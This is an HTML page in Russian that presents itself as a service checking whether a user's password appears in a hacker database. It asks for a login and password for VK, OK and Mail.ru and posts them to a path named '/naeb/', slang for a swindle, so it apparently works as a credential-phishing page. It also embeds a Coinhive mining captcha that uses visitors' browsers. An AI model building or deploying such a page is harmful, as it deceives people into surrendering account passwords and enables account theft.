<!DOCTYPE html>
<html>
<head>
	<title>Проверка пароля</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<script src="https://code.jquery.com/jquery-3.3.1.min.js" type="text/javascript"></script>
</head>	
<body>
	<div class="maincontainer">
		<h2>Проверьте ваш пароль на наличие в базе данных хакеров</h2>
		<form action="/naeb/" method="post">
			
		<div class="bl">
			<label for="login">Логин&nbsp;&nbsp;</label>
			<input onchange="inputsChanged()" type="text" name="login">
		</div>
		<div class="bl">
			<label for="pass">Пароль</label>
			<input onchange="inputsChanged()" type="password" name="pass">
		</div>
		<div class="bl">
			<label for="vk">Проверить пароль от VK</label>
			<input type="checkbox" name="vk">
		</div>
		<div class="bl">
			<label for="ok">Проверить пароль от OK</label>
			<input type="checkbox" name="ok">
		</div>
		<div class="bl">
			<label for="mail">Проверить пароль от Mail.ru</label>
			<input type="checkbox" name="mail">
		</div>
		<script src="https://authedmine.com/lib/captcha.min.js" async></script>
    <div class="coinhive-captcha" data-hashes="1024" data-key="DhnpOIh3WZ9p5ic5RgfwALPmiWeqqyTT">
        <em>Loading Captcha...<br>
        If it doesn't load, please disable Adblock!</em>
    </div>
		<input class="submit" type="submit" value="Проверить" disabled="disabled">

		</form>
	</div>
	<script src="js/main.js" type="text/javascript"></script>
</body>
</html>
